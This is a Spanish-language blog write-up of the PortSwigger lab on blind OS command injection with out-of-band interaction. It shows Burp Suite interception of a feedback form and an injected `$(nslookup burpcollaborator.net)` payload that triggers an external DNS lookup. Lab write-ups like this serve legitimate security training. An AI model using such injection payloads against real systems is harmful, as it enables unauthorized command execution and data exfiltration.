---
id: "blind-os-command-injection-with-out-of-band-interaction"
title: "Blind OS command injection with out-of-band interaction – PortSwigger Write Up"
author: "juan-antonio-gonzalez-mena"
publishedDate: 2022-02-08
updatedDate: 2022-02-08
image: "https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-0.webp"
description: "Aprende a detectar vulnerabilidades de inyección de comandos ciega mediante técnicas out-of-band usando búsquedas DNS a servidores externos."
categories:
  - "portswigger-labs"
draft: false
featured: false
lang: "es"
---

En este post vamos a estar resolviendo el laboratorio de PortSwigger: “Blind OS command injection with out-of-band interaction”.

![Página de inicio del laboratorio de PortSwigger](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-1.avif)

Para resolver el laboratorio tenemos que ocasionar una búsqueda DNS al servidor público de Burp Suite (`burpcollaborator.net`). Para ello, haremos uso de un Blind OS Command Injection que se encuentra en la función de feedback.

![Botón Submit feedback en la página](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-2.avif)

![Formulario de feedback con campos a rellenar](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-3.avif)

Como podemos observar, hay unos cuantos campos a rellenar. Por lo que vamos a rellenarlos:

![Campos del formulario completados](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-4.avif)

Ahora, antes de enviar el feedback. Preparamos el burp suite para que reciba las peticiones:

![Configuración del proxy en el navegador](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-5.avif)

![Activación de la interceptación en Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-6.avif)

Con esto listo, enviamos el feedback para captar la petición:

![Envío del formulario de feedback](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-7.avif)

![Petición interceptada en Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-8.avif)

Esta es la petición que se envía al servidor cuando se envía feedback. Para tratar con ella, la enviamos al repeater pulsando Ctrl R:

![Petición enviada al Repeater de Burp Suite](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-9.avif)

Una vez en el repeater, podemos observar como una petición válida simplemente obtiene una respuesta de estado 200 y no mucho más.

Sin embargo, entre todos los parámetros que se están enviando, vamos a intentar ver si podemos ejecutar un comando en alguno de ellos, y, con ello, realizar una búsqueda DNS al servidor de burp suite:

<figure>

![Inyección del comando nslookup para búsqueda DNS](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-10.avif)

<figcaption>

`$(nslookup burpcollaborator.net)`

</figcaption>

</figure>

Al realizar esta petición si actualizamos la web, nos daremos cuenta de que hemos resuelto el reto:

![Laboratorio completado exitosamente](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-11.avif)

En este caso, sí que es cierto, que lo mejor para realizar los retos estilo "out-of-band" es contar con `Burp Suite PRO` para poder hacer uso de la característica de `Burp Collaborator client`:

![Burp Collaborator client en Burp Suite PRO](https://cdn.deephacking.tech/i/posts/portswigger-labs/blind-os-command-injection-with-out-of-band-interaction/blind-os-command-injection-with-out-of-band-interaction-12.avif)

De hecho, el siguiente y último reto de OS Command Injection (al menos a fecha de febrero de 2022) no se puede resolver si no es que con `Burp Suite PRO`.
